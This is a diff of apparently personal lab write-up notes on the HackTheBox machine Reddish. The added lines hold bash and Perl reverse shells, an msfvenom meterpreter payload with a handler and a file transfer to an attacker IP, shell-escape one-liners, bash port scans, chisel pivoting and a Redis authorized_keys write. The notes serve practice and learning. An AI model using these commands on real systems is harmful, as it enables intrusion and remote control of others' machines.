@@ -57,10 +57,9 @@ Day 1 : `ab68fb463e681b499d99226ce92e12e9`
 Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
 Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
 Day 4: After some practice elsewhere
-Day 5: `c811816e50d58bd34204067b8ba3ae80`
-Day 6: `c811816e50d58bd34204067b8ba3ae80`
+Day 5-7: `c811816e50d58bd34204067b8ba3ae80`
 
-As of Day 5-; I have learn so much as to why my approaches were good
+As of Day 5-7; I have learn so much as to why my approaches were good
 1. Manual combing the with burp site and asking questions is really good
 1. Given time limits I was and set myself to try to expand my experience of different possiblities of problem, rushing and missing the key seems so silly, but indicative of me stress testing to push my brain to make me care a  great deal about hacking and solving boxes 
 	- Neurologically very important
@@ -93,8 +92,27 @@ TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE th
 
 ## Docker Foothold
 
+Spawning TTYs
+```bash
+echo 'os.system('/bin/bash')'
+/bin/sh -i
+/bin/bash -i
+perl -e 'exec "/bin/sh"'
+lua -e "os.execute('/bin/sh')"
+ruby -e 'exec "/bin/sh"'
+# From within vi
+:!bash
+:set shell=/bin/bash:shell
+# From within nmap
+!sh
+```
+
 First one and half is a half and then get two for the two is one reverse shell rule.
 1. `bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
+2. Perl is on the box:
+```bash
+perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 [Reading 0xDF try various functionality of the NodeRed application](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#code-execution--shell-in-node-red), I decided that an additional beyond root would be to do the same and the highest goal being to try to create a proxy via the NodeRED. In the beyond root section I will outline a proxy and other stuff both 0xdf and atleast one idea if I do not complete a proxy.
 
@@ -103,12 +121,49 @@ As a Day <4 note to self: even though I like ncat and netcat, I am glad to final
 Checking whether I can run in memory on the box:
 ![](noexecshm.png)
 
+After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 
+
+![](noexeconshm.png)
+
+[/dev/shm is a common directory for marshalling and operating from in Linux for attackers as it directory that is a tempory file storage that uses RAM for the backing store](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp. It is flushed leaving no trace of execution or what was put in that directory. It is also faster as than disk storage. For hardening
+```bash
+# To check flags 
+mount | grep shm 
+# Mitigation
+sudo mount -o remount,noexec /dev/shm
+```
+
 Ippsec's `cat` file transfer is OP. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
 ```bash
 bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
 ```
 
-LinEnum finds Docker
+With the new and improved [Hacktools](https://github.com/LasCC/Hack-Tools) tried meterpreter https and the nice copy and paste workflow... 
+```bash
+# Initial shell from Node RED
+nc -lvnp 8000
+# call 
+bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
+# Beware it does not auto update fields!
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.132 LPORT=4444 --platform linux -a x64 -n 200 -e cmd/generic_sh -i 4 -f elf -o rshell
+
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.132; set LPORT 4444; run"
+
+nc -lvnp  9696 < met
+# On Node RED:
+bash -c "cat < /dev/tcp/10.10.14.132/9696 > /tmp/met"
+# chmod and use nohup to persist after ctrl+c the shell to get it back again
+chmod +x met
+nohup ./met
+[Ctrl + c]
+# Restart secondardy shell from the initial
+bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
+# Meterpreter
+meterpreter > shell
+
+```
+
+Previous days LinEnum finds Docker
 ![docker](weareindocker.png)
 
 ```bash
@@ -159,8 +214,10 @@ Oneliner versions
 
 ![](pingsweepresult.png)
 
+Identifying other boxes on the network.
+- arp cache for Ipv4 resolution
 
-Oxdf better one liners
+Oxdf better one liners 
 ```bash
 # The reason I copy and paste these is the output is better handled 
 # it is done in the background
@@ -170,20 +227,22 @@ for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep "bytes from" | cut -d':'
 for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done                    
 ```
 
-Identifying other boxes on the network
-
 Fingerprinting without nmap, etc using brain and cli. 
 
-
-Port scanning
+Port scanning with bash and /dev/tcp  
 ```bash
 for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done
 
 for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.18.0.1/$port && echo "open - $port") 2> /dev/null; done
 ```
 
+The output for command above
 ![1000](port80on3.png)
 
+Ippsec inspired reverse pivot excalidraw-ing
+![1080](ippsecreversepivotpowerpoint.excalidraw)
+
+Ippsec discuss reducing the size of go binaries
 ```bash
 # Remember if you compile for another system
 # On target machine:
@@ -193,25 +252,26 @@ CGO_ENABLED=0 go build -ldflags="-s -w" # For static without c runtime libraries
 # -s strip binary of debug info
 # -w strip of dwarf infomation 
 upx chisel
+```
+
+Improved cli
+```bash
 # Setup proxychains and chisel
-./chisel server -p 8888 --reverse
-# curl chisel run client 
-curl http://10.10.14.109/chisel -o chisel
-./chisel client 10.10.14.109:8888 R:socks
+# Added -host over 0.0.0.0 default which is expose to the internet
+./chisel server -host 127.0.0.1 -p 9000 --reverse -v
+# 
+# 0xDF notes that the .2-4 address randomise for www,nodered and redis
+targetIP= # the IP we want to target only accessible from nodered.
+targetPORT= # the port we what to view from the portscan
+
+./chisel client 10.10.14.132:9000 R127.0.0.1:9001:$targetIP:$targetPORT
 proxychains nmap -sT -F 
 ```
 
-You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`
 
-After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 
+You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`. From hellscape of the [[Squid-Helped-through]] machine where I hit the hard wall finding the proxy, but experiementing with what can and cannot be tunnelled.
 
-![](noexeconshm.png)
 
-[/dev/shm is a common directory for marshalling and operating from in Linux for attackers as it directory that is a tempory file storage that uses RAM for the backing store](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp. It is flushed leaving no trace of execution or what was put in that directory. It is also faster as than disk storage. For hardening
-```bash
-sudo mount -o remount,noexec /dev/shm
-mount | grep shm # to check flags
-```
 
 Burpsuite socks proxy
 ![](proxyburpproxyception.png)
@@ -232,15 +292,18 @@ Some checks urls
 
 Ippsec provides justification based on the details in the code that there is database. Therefore on the network interface IP could be docker containers, database and the `http://172.19.0.3/` being the webserver. 
 
-`for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done`
+```bash
+for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done
+```
 
+... and the output:
 ![1000](portscan-2.png)
 
-
+Using nmap -sC and -sV to identify for the screenshot:
 ![](redisrce.png)
 I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 
 
-![](Reddish-Unfinished)
+![](Reddish-InitialThinking.md)
 
 
 ![](bamsearchsploit.png)
@@ -253,7 +316,7 @@ Before reading the exploitation of Redis without metasploit. Tunnelling to get t
 $ redis-cli -h 192.168.1.11 flushall
 $ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
 # Looks good. How to dump our memory content into the authorized_keys file? 
-# That’skinda trivial.
+# That’s kinda trivial.
 $ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir
 1) "dir"
 2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys" 
